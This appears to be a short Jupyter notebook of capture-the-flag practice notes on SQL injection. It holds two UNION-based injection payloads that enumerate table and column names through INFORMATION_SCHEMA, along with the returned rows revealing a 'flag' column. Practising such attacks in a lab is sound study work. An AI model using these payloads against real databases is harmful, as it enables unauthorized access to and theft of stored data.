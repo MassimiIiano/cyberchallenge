{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# SQL injection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "sql"
    }
   },
   "outputs": [],
   "source": [
    "SELECT * FROM dummy_data \n",
    "    WHERE id='' \n",
    "        UNION SELECT 1,2,3,4,5, column_name \n",
    "            FROM INFORMATION_SCHEMA.columns \n",
    "                WHERE table_name = 'real_data'\n",
    " -- -'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## returns\n",
    "1, 2, 3, 4, 5, id\n",
    "1, 2, 3, 4, 5, flag"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "sql"
    }
   },
   "outputs": [],
   "source": [
    "SELECT * FROM dummy_data \n",
    "    WHERE id=''\n",
    "\n",
    "\n",
    "UNION SELECT 1,2,3,4,table_name, column_name\n",
    "    FROM INFORMATION_SCHEMA.columns \n",
    "        WHERE table_schema = DATABASE()\n",
    "-- -'\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## result\n",
    "1, 2, 3, 4, real_data, id\n",
    "1, 2, 3, 4, real_data, flag\n",
    "1, 2, 3, 4, dummy_data, idk_what_im_doing\n",
    "1, 2, 3, 4, dummy_data, id\n",
    "1, 2, 3, 4, dummy_data, foobar\n",
    "1, 2, 3, 4, dummy_data, dummy_int\n",
    "1, 2, 3, 4, dummy_data, dummy_column\n",
    "1, 2, 3, 4, dummy_data, another_column"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
